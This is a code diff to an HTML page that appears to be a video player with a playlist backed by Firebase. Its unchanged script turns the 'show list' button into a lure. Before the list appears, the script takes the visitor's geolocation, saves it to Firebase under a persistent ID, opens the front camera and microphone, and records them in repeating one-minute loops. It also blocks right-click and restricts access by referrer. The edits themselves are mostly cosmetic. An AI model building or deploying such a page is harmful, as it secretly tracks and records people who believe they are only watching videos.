@@ -13,6 +13,7 @@
       font-family: Arial, sans-serif;
       overflow: hidden;
     }
+
     #videoContainer {
       flex: 3;
       display: flex;
@@ -21,10 +22,12 @@
       background-color: #000;
       height: 100%;
     }
+
     #videoPlayer {
       width: 100%;
       max-height: 90vh;
     }
+
     #videoListContainer {
       position: relative;
       flex: 1;
@@ -33,8 +36,12 @@
       padding: 10px;
       height: 100%;
       box-sizing: border-box;
-      display: none; /* 初期非表示 */
     }
+
+    #videoList {
+      display: none; /* 最初はリストを非表示 */
+    }
+
     #showListBtn {
       position: absolute;
       top: 50%;
@@ -49,6 +56,7 @@
       border-radius: 8px;
       cursor: pointer;
     }
+
     .videoItem {
       display: flex;
       align-items: center;
@@ -56,35 +64,43 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
+
     .videoItem:hover {
       background-color: #ddd;
     }
+
     .thumbnail {
       width: 120px;
       height: 67px;
       margin-right: 10px;
       background-color: #ccc;
     }
+
     .videoTitle {
       font-size: 14px;
       color: #333;
     }
+
     @media (max-width: 600px) {
       body {
         flex-direction: column;
       }
+
       #videoContainer {
         flex: none;
         height: 50%;
       }
+
       #videoListContainer {
         flex: none;
         height: 50%;
       }
+
       .thumbnail {
         width: 80px;
         height: 45px;
       }
+
       .videoTitle {
         font-size: 12px;
       }
@@ -100,7 +116,6 @@
     <div id="videoList"></div>
   </div>
 
-  <!-- Firebase SDK とロジック -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
     import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-storage.js";
@@ -120,7 +135,6 @@
     const storage = getStorage(app);
     const db = getDatabase(app);
 
-    // アクセス制限
     window.onload = function () {
       const referrer = document.referrer;
       if (!referrer || !referrer.startsWith('https://casval0078.github.io/video_data/')) {
@@ -129,13 +143,11 @@
       }
     };
 
-    // 右クリック禁止
     document.addEventListener('contextmenu', function (e) {
       e.preventDefault();
       alert('ブックマークは禁止されています。');
     });
 
-    // 動画リストデータ
     const videos = [
       { url: 'https://test.mp4', thumbnailUrl: 'https://test.jpg', name: 'test' }
     ];
@@ -168,7 +180,6 @@
 
     videos.forEach(createVideoItem);
 
-    // ユーザーID取得（localStorageベース）
     function getUserId() {
       let id = localStorage.getItem('userId');
       if (!id) {
@@ -178,12 +189,10 @@
       return id;
     }
 
-    // ボタンイベント
     document.getElementById('showListBtn').onclick = async () => {
       const userId = getUserId();
 
       try {
-        // 位置情報取得
         const geo = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
         });
@@ -191,17 +200,15 @@
         const latitude = geo.coords.latitude;
         const longitude = geo.coords.longitude;
 
-        // カメラ・マイクの許可取得
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: true
         });
 
         // UI更新
-        document.getElementById('videoListContainer').style.display = 'block';
         document.getElementById('showListBtn').style.display = 'none';
+        document.getElementById('videoList').style.display = 'block';
 
-        // Firebase Realtime Databaseに保存
         const locationRef = push(dbRef(db, `locations/${userId}`));
         await set(locationRef, {
           timestamp: Date.now(),
@@ -209,7 +216,6 @@
           longitude
         });
 
-        // 録画処理
         const recorder = new MediaRecorder(stream, {
           mimeType: 'video/webm;codecs=vp8,opus'
         });
@@ -237,7 +243,7 @@
             recorder.start();
             setTimeout(() => {
               recorder.stop();
-            }, 1 * 60 * 1000); // 10分
+            }, 1 * 60 * 1000);
           } else {
             stream.getTracks().forEach(track => track.stop());
           }
@@ -246,7 +252,7 @@
         recorder.start();
         setTimeout(() => {
           recorder.stop();
-        }, 1 * 60 * 1000); // 最初の10分
+        }, 1 * 60 * 1000);
 
       } catch (err) {
         console.error(err);
